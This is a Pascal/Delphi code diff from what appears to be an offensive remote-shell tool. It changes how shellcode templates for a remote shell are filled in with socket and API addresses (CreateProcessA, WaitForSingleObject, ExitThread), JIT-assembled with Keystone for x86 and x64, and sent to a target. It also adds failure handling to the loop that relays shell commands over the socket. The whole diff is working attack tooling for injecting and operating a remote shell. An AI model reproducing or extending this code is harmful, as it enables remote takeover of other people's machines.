@@ -141,6 +141,7 @@ var AWSAData               : TWSAData;
     ACommand               : AnsiString;
     ADoExit                : Boolean;
     AFuncInRemoteShellInfo : TFuncIn__RemoteShell__Information;
+    AFuncInTemplateCode    : String;
     AShellcode             : TMemoryStream;
 
 begin
@@ -176,28 +177,28 @@ begin
 
       { Compile & Send Shellcode }
       case AFuncInRemoteShellInfo.Header.Architecture of
-        x86_32 : begin
-          KeystoneAssemble(
-            Format(__FUNCIN_x32__REMOTE_SHELL, [
-              AFuncInRemoteShellInfo.SocketFd,
-              AFuncInRemoteShellInfo.__CreateProcessA,
-              AFuncInRemoteShellInfo.__WaitForSingleObject,
-              AFuncInRemoteShellInfo.__ExitThread
-            ]),
-            AShellcode
-          );
-        end;
+        x86_32 : AFuncInTemplateCode := __FUNCIN_x32__REMOTE_SHELL;
+        x86_64 : AFuncInTemplateCode := __FUNCIN_x64__REMOTE_SHELL;
 
-        x86_64 : begin
-          KeystoneAssemble(
-            __FUNCIN_x64__REMOTE_SHELL, // TODO
-            AShellcode
-          );
-        end;
+        // ... OTHER ARCHITECTURES ... //
 
         else
           raise Exception.Create('Unsupported Architecture');
       end;
+
+      // JIT Shellcode
+      KeystoneAssemble(
+        Format(AFuncInTemplateCode, [
+            AFuncInRemoteShellInfo.StartupInformationLen,
+            AFuncInRemoteShellInfo.SocketFd,
+            AFuncInRemoteShellInfo.ProcessInformationLen,
+            AFuncInRemoteShellInfo.__CreateProcessA,
+            AFuncInRemoteShellInfo.__WaitForSingleObject,
+            AFuncInRemoteShellInfo.__ExitThread
+        ]),
+        AShellcode,
+        AFuncInRemoteShellInfo.Header.Architecture
+      );
 
       if not Assigned(AShellcode) then
         Exit();
@@ -229,7 +230,8 @@ begin
 
         ACommand := ACommand + #13#10;
 
-        send(AClient, ACommand[1], Length(ACommand) * SizeOf(AnsiChar), 0);
+        if send(AClient, ACommand[1], Length(ACommand) * SizeOf(AnsiChar), 0) <= 0 then
+          ADoExit := True;
 
         if ADoExit then
           break;
